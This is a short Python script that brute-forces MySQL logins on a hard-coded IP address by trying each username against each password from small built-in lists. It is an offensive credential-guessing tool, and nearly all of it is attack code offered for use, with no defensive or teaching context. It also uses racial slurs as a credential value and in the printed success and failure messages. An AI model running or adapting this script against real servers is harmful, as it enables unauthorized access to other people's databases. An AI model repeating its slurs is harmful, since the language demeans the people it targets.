import MySQLdb
import os
import mysql.connector

ip = '1.1.1.1'

username_array = [
  'root',
  'nig'
]

password_array = [
'root',
'nig'
]

def Brute(ip,username,password):
    try:
        conn = mysql.connector.connect(user=username, password=password, host=ip)
        return True
    except:
        return False


def main():
    for user in username_array:
        for passw in password_array:
            if Brute(ip,user,passw):
                print("Bruted nigger")
            else:
                print("fuck this nigga doesnt work lol")


if __name__ == "__main__":
    main()
